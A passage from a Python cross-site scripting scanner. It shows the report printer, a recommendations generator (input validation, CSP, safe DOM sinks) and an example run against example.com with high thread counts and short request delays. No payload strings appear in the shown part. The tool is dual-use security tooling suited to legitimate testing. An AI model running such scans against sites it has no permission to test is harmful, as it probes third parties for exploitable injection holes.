                print(f"{self.colors['info']}   Context: {vuln.get('context', 'Unknown')}")
                print(f"{self.colors['info']}   Confidence: {vuln.get('confidence', 0)}%")
                
                if vuln.get('payload'):
                    print(f"{self.colors['payload']}   Payload: {vuln['payload'][:80]}")
                
                if vuln.get('evidence'):
                    print(f"{self.colors['evidence']}   Evidence: {vuln['evidence'][:150]}...")
                
                print(f"{self.colors['timestamp']}   URL: {vuln.get('url', 'N/A')[:80]}...")
                print(f"{self.colors['separator']}{'-'*40}")
        
        # Print context analysis
        if results['context_analysis']:
            context = results['context_analysis']
            print(f"\n{self.colors['header']}📋 CONTEXT ANALYSIS:")
            print(f"{self.colors['separator']}{'-'*95}")
            
            if context.get('technologies'):
                print(f"{self.colors['info']}Technologies Detected:")
                for tech in context['technologies']:
                    print(f"{self.colors['info']}  • {tech}")
                print()
            
            if context.get('contexts'):
                print(f"{self.colors['info']}Contexts Found:")
                for ctx in context['contexts']:
                    print(f"{self.colors['context']}  • {ctx}")
                print()
            
            if context.get('forms'):
                print(f"{self.colors['info']}Forms Found: {len(context['forms'])}")
                for form in context['forms'][:3]:
                    print(f"{self.colors['info']}  • {form['method']} {form['action']}")
                    print(f"{self.colors['info']}    Inputs: {len(form['inputs'])}")
                print()
        
        # Print recommendations
        recommendations = self.generate_recommendations(results)
        if recommendations:
            print(f"\n{self.colors['header']}💡 RECOMMENDATIONS:")
            print(f"{self.colors['separator']}{'-'*95}")
            
            for i, rec in enumerate(recommendations, 1):
                priority_color = {
                    'critical': Back.RED + Fore.WHITE,
                    'high': Fore.RED + Style.BRIGHT,
                    'medium': Fore.YELLOW + Style.BRIGHT,
                    'low': Fore.BLUE + Style.BRIGHT
                }.get(rec['priority'], Fore.WHITE)
                
                print(f"{priority_color}{i}. [{rec['priority'].upper()}] {rec['title']}")
                print(f"{self.colors['info']}   {rec['description']}")
                print()
        
        # Final status
        if results['vulnerabilities']:
            if results['risk_score'] > 70:
                print(f"{self.colors['critical']}⚠ CRITICAL XSS VULNERABILITIES DETECTED! Immediate action required.")
            elif results['risk_score'] > 40:
                print(f"{self.colors['warning']}⚠ XSS vulnerabilities found. Review and fix immediately.")
            else:
                print(f"{self.colors['warning']}⚠ Potential XSS issues found. Further investigation recommended.")
        else:
            print(f"{self.colors['success']}✅ No XSS vulnerabilities detected.")
        
        print(f"{self.colors['separator']}{'='*95}\n")

    def generate_recommendations(self, results):
        """Generate targeted recommendations"""
        recommendations = []
        
        if results['vulnerabilities']:
            recommendations.append({
                'priority': 'critical',
                'title': 'Fix XSS Vulnerabilities',
                'description': f'Implement proper input validation and output encoding for {len(results["vulnerabilities"])} vulnerabilities'
            })
        
        # Check for specific vulnerability types
        vuln_types = set(v.get('type') for v in results['vulnerabilities'])
        
        if 'Reflected XSS' in vuln_types:
            recommendations.append({
                'priority': 'high',
                'title': 'Implement Input Validation',
                'description': 'Validate and sanitize all user inputs before processing'
            })
        
        if 'DOM-based XSS' in vuln_types:
            recommendations.append({
                'priority': 'high',
                'title': 'Secure DOM Manipulation',
                'description': 'Avoid using insecure DOM sinks like innerHTML, eval(), document.write()'
            })
        
        # General recommendations
        recommendations.extend([
            {
                'priority': 'high',
                'title': 'Implement Content Security Policy',
                'description': 'Deploy CSP headers to restrict script execution'
            },
            {
                'priority': 'medium',
                'title': 'Use Secure Frameworks',
                'description': 'Use frameworks with built-in XSS protection like React, Angular, Vue.js'
            },
            {
                'priority': 'medium',
                'title': 'Regular Security Testing',
                'description': 'Perform regular security scans and penetration testing'
            },
            {
                'priority': 'low',
                'title': 'Security Headers',
                'description': 'Implement security headers like X-XSS-Protection, X-Content-Type-Options'
            }
        ])
        
        return sorted(recommendations, key=lambda x: {'critical': 0, 'high': 1, 'medium': 2, 'low': 3}[x['priority']])

# Example usage
if __name__ == "__main__":
    scanner = XSSScanner()
    
    # Configure scanner
    scanner.max_threads = 15
    scanner.delay_between_requests = 0.05
    
    # Run scan
    target_url = "http://example.com/search?q=test"
    results = scanner.scan(target_url)
    
    # Run advanced scan
    advanced_options = {
        'advanced': True,
        'timeout': 20
    }
    advanced_results = scanner.scan(target_url, advanced_options)
    
    # Statistics
    total_payloads = sum(len(payloads) for payloads in scanner.payloads.values())
    print(f"\n{Fore.CYAN}Scanner Statistics:")
    print(f"{Fore.CYAN}• Total payloads: {total_payloads}")
    print(f"{Fore.CYAN}• Payload categories: {len(scanner.payloads)}")
    print(f"{Fore.CYAN}• XSS patterns: {sum(len(p) for p in scanner.xss_patterns.values())}")